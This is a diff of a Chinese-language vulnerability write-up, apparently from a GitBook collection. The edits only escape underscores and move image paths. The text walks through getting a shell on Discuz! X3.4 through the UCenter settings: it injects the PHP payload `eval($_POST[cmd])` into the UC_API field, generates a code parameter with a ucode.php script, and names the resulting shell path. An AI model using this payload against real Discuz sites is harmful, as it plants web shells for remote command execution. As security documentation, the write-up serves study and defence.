@@ -5,11 +5,11 @@
 漏洞利用流程如下：
 
 1. 进入后台`站长`-`UCenter设置`，修改UCenter通信密钥为`123456`。
-2. 修改UC_API=`http://your-ip/discuz!x3.4/uc_server');eval($_POST[cmd]);//`，点击保存。
-3. 利用UC_KEY(dz) 生成code参数，执行脚本`php ucode.php`生成code。
+2. 修改UC\_API=`http://your-ip/discuz!x3.4/uc_server');eval($_POST[cmd]);//`，点击保存。
+3. 利用UC\_KEY(dz) 生成code参数，执行脚本`php ucode.php`生成code。
 4. Burpsuite带code参数发送GET请求，结果为1表示成功。
 
-![img](images/1589986439989.png)
+![img](../.gitbook/assets/1589986439989.png)
 
 生成code参数的脚本 ucode.php：
 
@@ -75,7 +75,7 @@ function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
 
 带code参数发送GET请求：
 
-![img](images/1589987534699.png)
+![img](../.gitbook/assets/1589987534699.png)
 
 请求数据包：
 
@@ -101,4 +101,3 @@ Shell 地址：
 ```
 http://your-ip/discuz!x3.4/config/config_ucenter.php
 ```
-
